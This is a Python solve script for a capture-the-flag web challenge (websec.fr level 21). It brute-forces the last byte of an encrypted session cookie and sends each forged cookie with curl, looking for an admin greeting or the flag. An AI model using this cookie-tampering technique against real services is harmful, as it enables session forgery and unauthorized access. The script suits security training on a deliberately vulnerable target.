#!/usr/bin/env python3
import binascii
import subprocess
import re

cookie = "3c54c8bbdf06fa36b435837068f53c149bcfc5d06a599d2403d8a9c49c18c03f48fbec1c43b4dd354c6ea1c62b32966d7c0761cca9ef2a9bfb02d2dd5150ba8d8a44b56b426ea8aff342bc79f4665864"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

ct_orig = bytearray(binascii.unhexlify(ct_hex))

print("Brute forcing último byte del ciphertext...")
print("Buscando flag o Hello admin...\n")

for val in range(256):
    ct_test = bytearray(ct_orig)
    ct_test[-1] = val
    
    cookie_test = iv_hex + binascii.hexlify(ct_test).decode()
    
    cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_test}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    # Buscar flag
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
    if flag_match:
        print(f"\n★★★ BYTE 0x{val:02x}: FLAG ENCONTRADA! ★★★")
        print(f"Flag: {flag_match.group(0)}")
        break
    
    # Buscar "Hello admin"
    if "Hello admin" in result.stdout:
        print(f"\n★★★ BYTE 0x{val:02x}: HELLO ADMIN! ★★★")
        print(result.stdout[:500])
        break
    
    if val % 16 == 0:
        print(f"  Probado hasta 0x{val:02x}...")

print("\nBrute force completado")
